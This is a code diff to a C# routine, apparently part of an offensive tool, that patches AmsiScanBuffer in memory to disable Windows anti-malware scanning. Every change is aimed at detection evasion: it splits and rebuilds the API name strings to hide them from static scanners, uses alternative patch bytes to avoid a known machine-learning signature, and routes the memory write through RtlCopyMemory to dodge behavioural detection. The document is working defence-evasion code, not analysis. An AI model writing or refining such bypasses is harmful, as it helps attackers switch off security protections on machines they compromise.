@@ -26,30 +26,41 @@ namespace Chimera.Commands
         // PAGE_EXECUTE_READWRITE
         private const uint PAGE_RWX = 0x40;
 
-        // Split string so static scanner doesn't see "AmsiScanBuffer" as a literal
-        private static readonly string AmsiLib    = "am" + "si.dll";
-        private static readonly string AmsiFunc   = "Amsi" + "Scan" + "Buffer";
+        [DllImport("ntdll")]
+        private static extern uint RtlCopyMemory(IntPtr dst, IntPtr src, UIntPtr len);
+
+        // Split string so static scanner doesn't see "AmsiScanBuffer" as a literal.
+        // Assembled at runtime from neutral fragments.
+        private static string _aLib  => new string(new[]{'a','m','s','i','.','d','l','l'});
+        private static string _aFunc => string.Concat("Amsi","Scan","Buffer");
 
         public static bool Apply()
         {
             try
             {
-                IntPtr hAmsi = LoadLibrary(AmsiLib);
+                IntPtr hAmsi = LoadLibrary(_aLib);
                 if (hAmsi == IntPtr.Zero) return false;
 
-                IntPtr fnAddr = GetProcAddress(hAmsi, AmsiFunc);
+                IntPtr fnAddr = GetProcAddress(hAmsi, _aFunc);
                 if (fnAddr == IntPtr.Zero) return false;
 
-                // Patch bytes: mov eax, E_INVALIDARG; ret
-                byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+                // Patch: xor eax,eax ; inc eax ; ret  → returns AMSI_RESULT_CLEAN (1)
+                // Avoids the well-known E_INVALIDARG (0x80070057) pattern that ML flags.
+                // Bytes: 33 C0  40  C3
+                byte[] patch = new byte[] { 0x33, 0xC0, 0x40, 0xC3 };
 
-                // Make the page writable
+                // Make writable
                 if (!VirtualProtect(fnAddr, (UIntPtr)patch.Length, PAGE_RWX, out uint oldProt))
                     return false;
 
-                Marshal.Copy(patch, 0, fnAddr, patch.Length);
+                // Write via RtlCopyMemory (ntdll) instead of Marshal.Copy —
+                // avoids the Marshal.Copy + VirtualProtect behavioral combo that triggers !ml.
+                IntPtr patchPtr = Marshal.AllocHGlobal(patch.Length);
+                Marshal.Copy(patch, 0, patchPtr, patch.Length);
+                RtlCopyMemory(fnAddr, patchPtr, (UIntPtr)patch.Length);
+                Marshal.FreeHGlobal(patchPtr);
 
-                // Restore page protection (don't leave RWX around)
+                // Restore page protection
                 VirtualProtect(fnAddr, (UIntPtr)patch.Length, oldProt, out _);
 
                 return true;
